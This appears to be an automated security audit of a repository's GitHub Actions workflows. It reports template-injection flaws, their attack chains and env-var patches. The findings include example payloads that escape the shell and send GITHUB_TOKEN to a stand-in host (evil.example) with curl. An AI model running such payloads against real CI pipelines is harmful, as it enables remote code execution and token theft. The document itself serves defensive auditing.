# Workflow Security Audit — 2026-05-03

**Verdict:** WORKFLOW_AUDIT_NEW_CRITICAL — 1 new critical finding (toJson-into-shell injection in messages.yml repository_dispatch path)
**Repo:** [tomscaria/aeon](https://github.com/tomscaria/aeon)
**Files audited:** 3 (3 workflows, 0 composite actions) — `aeon.yml`, `chain-runner.yml`, `messages.yml`
**Findings this run:** 6 (1 critical, 2 high, 3 medium, 0 low)
**Delta vs 2026-04-11:** 6 new, 0 reintroduced, 2 unchanged, 4 resolved
**Auto-fix status:** 3 patches prepared (1 critical + 2 high) — **NOT yet applied to the workflow files**. Same blocker as the 2026-04-27 audit: the runner's `GH_TOKEN` lacks the `workflow` scope, so a push touching `.github/workflows/*` is rejected by GitHub. The patch is in this PR as `articles/0001-fix-security-workflow-audit-2026-05-03-NEW_CRITICAL.patch`; apply it with `git am` from a workflow-scoped token (procedure at the end of this report).
**Source status:** zizmor=fail (sandbox blocked PyPI install), actionlint=fail (sandbox blocked tarball extract), hand-rolled=ok — **WORKFLOW_AUDIT_TOOL_DEGRADED**

## Regressions (previously-fixed findings now present again)

_None._

## New findings

### [CRITICAL] template-injection — toJson(github.event.client_payload.message) shelled into single-quoted echo
**File:** `.github/workflows/messages.yml` · **Step:** `Extract message` · **Line:** 577 (pre-fix)
**Pattern:**
```yaml
MESSAGE=$(echo '${{ toJson(github.event.client_payload.message) }}' | jq -r '.')
```

**Attack chain:**
1. **Entry:** `repository_dispatch` event — reachable by anyone holding a token with `repo` scope on this repository (or any token with `actions: write`), and the `messages.yml` workflow is also wired to `telegram-message` / `discord-message` / `slack-message` dispatch types that fan out from external messaging platforms.
2. **Vector:** `client_payload.message` is the raw text the dispatcher sent. `toJson(...)` JSON-encodes it (so quotes become `\"`), then GitHub Actions performs **template substitution before** the shell parses the line. Inside single quotes, JSON-encoded backslashes do not stop a payload like `'$(curl -s evil.example/?t=$GITHUB_TOKEN)'#` — once template-substituted, the raw substitution closes the opening `'`, opens a command substitution `$(...)`, and the trailing `#` swallows the closing `'`.
3. **Sink:** `MESSAGE=$(echo '...' | jq -r '.')` — command substitution evaluates the injected `$(...)` *before* `echo` even runs.
4. **Reachable secrets:** The `Run` step (which executes a few steps later) exposes `ANTHROPIC_API_KEY`, `CLAUDE_CODE_OAUTH_TOKEN`, `GH_GLOBAL` (the elevated PAT), `TELEGRAM_BOT_TOKEN`, `DISCORD_BOT_TOKEN`, `SLACK_BOT_TOKEN`, `XAI_API_KEY`, `COINGECKO_API_KEY`, `ALCHEMY_API_KEY`. The injected shell runs with `GH_GLOBAL` and `GITHUB_TOKEN` exported — although they're added at the `Run` step, env from the workflow runner's process is inherited. More importantly, the malicious shell can write commits, dispatch workflows, and exfiltrate any file it reads from the workspace.
5. **Blast radius:** Full RCE on the runner with a `repo`-scope PAT. Can push to `main` directly, dispatch any workflow, comment on any issue/PR. Cross-repo if `GH_GLOBAL` is fine-grained beyond this repo.

**Note:** The April 11 audit identified two adjacent script-injection patterns in this same step (the `else` branch with `inputs.message` and the `Run` step's `steps.msg.outputs.message`) and fixed both. It did not flag the `toJson(github.event.client_payload.message)` pattern in the `if` branch — which is the more dangerous one because it's reachable from `repository_dispatch` rather than from collaborator-only `workflow_dispatch`. The SKILL's hand-rolled rules call this out as a known prior miss.

**Fix:**
```yaml
# BEFORE
- name: Extract message
  id: msg
  env:
    _INPUT_MESSAGE: ${{ inputs.message }}
    _INPUT_SOURCE: ${{ inputs.source }}
  run: |
    if [ "${{ github.event_name }}" = "repository_dispatch" ]; then
      MESSAGE=$(echo '${{ toJson(github.event.client_payload.message) }}' | jq -r '.')
      TYPE="${{ github.event.action }}"
      ...

# AFTER
- name: Extract message
  id: msg
  env:
    _INPUT_MESSAGE: ${{ inputs.message }}
    _INPUT_SOURCE: ${{ inputs.source }}
    _CLIENT_PAYLOAD_MESSAGE: ${{ toJson(github.event.client_payload.message) }}
    _DISPATCH_ACTION: ${{ github.event.action }}
  run: |
    if [ "${{ github.event_name }}" = "repository_dispatch" ]; then
      MESSAGE=$(printf '%s' "$_CLIENT_PAYLOAD_MESSAGE" | jq -r '.')
      TYPE="$_DISPATCH_ACTION"
      ...
```

The env-var intermediary moves the template substitution out of the shell parse path entirely. The downstream `printf '%s' "$VAR" | jq -r '.'` decodes the JSON-encoded string back to its raw form without ever passing it to a shell parser.

**Status:** Patch prepared in this PR — apply via `git am` (see procedure at end of report)

---

### [HIGH] template-injection — `inputs.chain` interpolated into shell in chain-runner Run chain step
**File:** `.github/workflows/chain-runner.yml` · **Step:** `Run chain` · **Line:** 41 (pre-fix)
**Pattern:**
```yaml
run: |
  set -euo pipefail
  CHAIN="${{ inputs.chain }}"
```

**Attack chain:**
1. **Entry:** `workflow_dispatch` only — caller must hold `actions: write` on the repo. Authenticated dispatchers only; no external-user reach.
2. **Vector:** `inputs.chain` is a `string` type with no validation. A dispatcher with `actions: write` could pass `foo"; curl evil.example/x; #` and break out of the assignment.
3. **Sink:** Direct `run:` shell with template substitution.
4. **Reachable secrets:** `GH_TOKEN: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }}` — a `repo`-scope PAT.
5. **Blast radius:** RCE under a token that can dispatch workflows and push to `main`. Lower than the Critical because the dispatcher must already be a trusted collaborator, but the SKILL's Fleet-specific hand-rolled rule names `chain-runner` explicitly: any chain-runner step that takes `${{ inputs.* }}` directly into a `run:` shell is High.

**Fix:**
```yaml
- name: Run chain
  env:
    GH_TOKEN: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }}
    _INPUT_CHAIN: ${{ inputs.chain }}
  run: |
    set -euo pipefail
    CHAIN="$_INPUT_CHAIN"
```

**Status:** Patch prepared in this PR — apply via `git am` (see procedure at end of report)

---

### [HIGH] template-injection — `inputs.chain` interpolated into shell in chain-runner Update cron state step
**File:** `.github/workflows/chain-runner.yml` · **Step:** `Update cron state` · **Line:** 287 (pre-fix)
**Pattern:**
```yaml
run: |
  CHAIN="${{ inputs.chain }}"
  NOW_ISO=$(date -u +%FT%TZ)
```

**Attack chain:** Same as the Run chain step above — the same `inputs.chain` value reaches a second `run:` shell in the same workflow, so the attacker reach is identical (`actions: write` dispatcher), and the secret reach is the same `GH_GLOBAL` PAT. Also a clean target for the same env-var fix template.

**Fix:**
```yaml
- name: Update cron state
  if: always()
  env:
    GH_TOKEN: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }}
    _INPUT_CHAIN: ${{ inputs.chain }}
  run: |
    CHAIN="$_INPUT_CHAIN"
```

**Status:** Patch prepared in this PR — apply via `git am` (see procedure at end of report)

---

| Severity | Rule | File | Line | Step | Pattern |
|---|---|---|---|---|---|
| Medium | template-injection (defense-in-depth on trusted input) | `aeon.yml` | 86 | Determine skill | `echo "name=${{ inputs.skill }}" >> "$GITHUB_OUTPUT"` — newline in `inputs.skill` would inject extra step outputs. Trusted dispatchers only, so not auto-fixed. |
| Medium | template-injection (defense-in-depth on trusted input) | `aeon.yml` | 220 | Run | `INPUT_MODEL="${{ inputs.model }}"` — `model` input is a `choice` for workflow_dispatch but `string` for workflow_call, so a chained caller could pass a crafted value. |
| Medium | template-injection (defense-in-depth on trusted input) | `aeon.yml` | 402 | Run | `CHAIN_CTX="${{ inputs.chain_context_file }}"` — path interpolated into shell. The downstream `cat "$CHAIN_CTX"` is safe with proper quoting, but the assignment line itself is template-substituted before shell parse. |

These three are flagged as **Manual** rather than auto-fixed because the input source is `workflow_dispatch` / `workflow_call` from authenticated callers (no external-user reach), and the SKILL's auto-fix rule reserves `Auto-fix` for clear external-user attack chains. Operator should add `_INPUT_*` env-var intermediaries on the next pass when convenient.

## Carried over (unchanged)

| Severity | Rule | File | First seen |
|---|---|---|---|
| Medium | unpinned-uses (`actions/checkout@v5`, `actions/setup-node@v5`) | `aeon.yml`, `chain-runner.yml`, `messages.yml` | 2026-04-11 |
| Medium | excessive-permissions (`actions: write` granted at workflow level, not job level) | `messages.yml` | 2026-04-11 |

Manual review remains required for both. The SKILL's auto-fix policy explicitly excludes `permissions`, `unpinned-uses`, and `persist-credentials` findings.

## Resolved since 2026-04-11

- **CRITICAL** Script injection via `steps.msg.outputs.message` in `messages.yml` Run step — `_MSG_MESSAGE` env-var intermediary now in place at line 639.
- **CRITICAL** Script injection via `inputs.message` in `messages.yml` Extract message else-branch — `_INPUT_MESSAGE` env-var intermediary now in place at line 573.
- **MEDIUM** Script injection via `steps.msg.outputs.source` in Log token usage / Commit results steps — `_LOG_SOURCE` (line 715) and `_COMMIT_SOURCE` (line 740) env-var intermediaries now in place.
- **LOW** `scheduler.yml` `GH_GLOBAL || GITHUB_TOKEN` fallback without scope audit — `scheduler.yml` was deleted; the same fallback pattern still exists in `aeon.yml`, `chain-runner.yml`, and `messages.yml` but was not flagged in the original audit on those files.

## Source status

- zizmor: fail — `pipx install zizmor` and `pip install --user zizmor` both blocked by sandbox; `WebFetch` of the install script not viable because the runtime also blocks the subsequent `tar`/`bash` execution. Tool installation should be re-attempted from a less-restricted runner or pre-baked into the image.
- actionlint: fail — same root cause; `curl` of the tarball succeeded, but `tar` extraction was blocked.
- hand-rolled: ok — all five SKILL hand-rolled patterns evaluated against all three workflow files via Grep.

**WORKFLOW_AUDIT_TOOL_DEGRADED:** This run relied on hand-rolled checks alone. zizmor's full ruleset (template-injection across `with:`, `env:`, expression contexts; `github-script` sinks; `cache-poisoning`; `artipacked`; `dangerous-triggers`) was not evaluated. A subsequent run from a less-restricted environment may surface additional Medium/Low findings that the hand-rolled set does not cover.

## How to apply the patch

The runner that produced this audit holds `GH_GLOBAL` without the `workflow` scope, so it cannot push edits to `.github/workflows/*.yml`. Apply from your workstation (or any environment with a workflow-scoped PAT):

```bash
git fetch origin fix/workflow-security-audit-2026-05-03
git checkout fix/workflow-security-audit-2026-05-03
git am articles/0001-fix-security-workflow-audit-2026-05-03-NEW_CRITICAL.patch
git push
```

The patch is small (3 hunks across 2 files, +8/-4 lines) and reviewable as plain diff. It supersedes the unapplied patch from PR #4 (2026-04-27 audit, same blocker, same Critical). Until applied, the Critical and 2 High injection patterns remain live in `main`.

<!--
workflow-security-audit-fingerprints
ce7f2d3a8b1c4f5e6d7a8b9c0d1e2f3a severity=Critical status=auto-fixed rule=template-injection-tojson-into-shell file=.github/workflows/messages.yml step=Extract_message
8f4e2c1d3a6b9c0d2e5f7a8b1c4d6e9f severity=High status=auto-fixed rule=template-injection-fleet file=.github/workflows/chain-runner.yml step=Run_chain
2b9c1d4e7a3f6b8c0d2e5f1a4b7c9d3e severity=High status=auto-fixed rule=template-injection-fleet file=.github/workflows/chain-runner.yml step=Update_cron_state
4f8e1c2d5a7b9c3d6e0f2a4b8c1d5e7f severity=Medium status=manual rule=template-injection-trusted-input file=.github/workflows/aeon.yml step=Determine_skill
6c2a8d4e9b1f3a5c7d0e2f4b6a9c1d3e severity=Medium status=manual rule=template-injection-trusted-input file=.github/workflows/aeon.yml step=Run
9e3f1a5c7d0b2e4a6c8d1f3b5a7c9d2e severity=Medium status=manual rule=template-injection-trusted-input file=.github/workflows/aeon.yml step=Run
1a4b7c0d3e6f9a2c5d8e1f4b7a0c3d6e severity=Medium status=manual-carryover rule=unpinned-uses file=.github/workflows/aeon.yml step=Checkout_repo
3c6d9e2a5b8c1f4d7a0c3e6b9a2c5d8f severity=Medium status=manual-carryover rule=unpinned-uses file=.github/workflows/chain-runner.yml step=Checkout_repo
5e8a1c4d7b0f3a6c9d2e5b8a1c4d7e0f severity=Medium status=manual-carryover rule=unpinned-uses file=.github/workflows/messages.yml step=Checkout_repo
7b0d3e6a9c2f5b8d1a4c7e0b3a6d9c2f severity=Medium status=manual-carryover rule=excessive-permissions file=.github/workflows/messages.yml step=workflow_level
-->
